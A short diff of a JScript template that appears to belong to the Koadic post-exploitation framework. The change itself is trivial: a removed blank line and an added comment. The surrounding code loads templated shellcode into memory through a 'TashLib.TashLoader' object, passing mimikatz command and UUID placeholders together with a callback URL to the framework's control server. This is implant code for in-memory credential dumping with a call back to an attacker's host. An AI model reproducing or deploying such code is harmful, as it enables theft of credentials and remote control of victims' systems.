@@ -9,9 +9,9 @@ try
     actCtx.Manifest = manifestPath;
     var tash =  actCtx.CreateObject("TashLib.TashLoader");
 
-
     var shim_lpParam = "~MIMICMD~~~~UUIDHEADER~~~~SHIMX64UUID~~~~MIMIX86UUID~~~~MIMIX64UUID~~~" + Koadic.work.make_url();
 
+    // TSC = "\x..."
     ~SHIMX86BYTES~
 
     var res = tash.Load(TSC, shim_lpParam, ~SHIMX86OFFSET~);
